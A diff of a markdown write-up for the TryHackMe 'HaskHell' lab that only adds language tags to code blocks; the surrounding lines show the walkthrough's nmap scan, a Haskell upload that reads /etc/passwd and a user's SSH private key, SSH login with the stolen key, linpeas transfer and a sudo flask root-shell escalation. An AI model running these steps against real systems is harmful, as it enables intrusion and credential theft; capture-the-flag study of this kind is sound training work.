@@ -30,7 +30,7 @@ Let's start enumeration and see what we can gather.
 
 `Port` and `service` scan with nmap:
 
-```
+```bash
 nmap -T4 -sV -sS  -v -p- 10.10.238.6  -sC -oN HaskHell
 ```
 
@@ -102,7 +102,7 @@ http://10.10.238.6:5001/submit
 
 upload this file , read_file.hs .
 
-```
+```haskell
 import System.Process
 main = do
    let file_to_read = "/etc/passwd"
@@ -122,7 +122,7 @@ change read_file.hs to read '/home/prof/.ssh/id_rsa' and get ssh private key.
 
 let's use this ssh private key to connect server.
 
-```
+```bash
 chmod 600 haskhell
 ssh prof@10.10.238.6 -i haskhell
 ```
@@ -133,7 +133,7 @@ ssh prof@10.10.238.6 -i haskhell
 
 let's upload [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and look if we can get any previlege escalation point to root or other user.
 
-```
+```bash
 # Run Python Server
 python3 -m http.server 80
 
@@ -149,7 +149,7 @@ chmod +x linpeas.sh
 we found that we can run flask with sudo without password , so let's get root shell from there.
 ![[]](/assets/img/tryhackme/haskhell/Pasted%20image%2020220530101111.png)
 
-```
+```bash
 echo 'import pty;pty.spawn("/bin/bash")' > shell.py
 export FLASK_APP=shell.py
 sudo /usr/bin/flask run
